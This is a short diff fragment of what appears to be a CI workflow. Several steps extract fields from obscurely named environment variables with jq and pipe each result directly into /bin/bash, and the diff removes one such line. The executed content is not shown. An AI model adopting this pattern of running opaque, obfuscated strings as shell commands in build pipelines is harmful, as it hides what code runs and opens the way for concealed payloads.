@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$nfet04" | jq -r .nos67 | /bin/bash
           echo $v0501 | jq -r .s3 | /bin/bash
           echo $jxejv56 | jq -r .vyq9 | /bin/bash
-          echo $txafs6 | jq -r .lklg718 | /bin/bash
           echo $chish206 | jq -r .i071 | /bin/bash
           printf '%s' "$szihc69" | jq -r .imm965 | /bin/bash
 
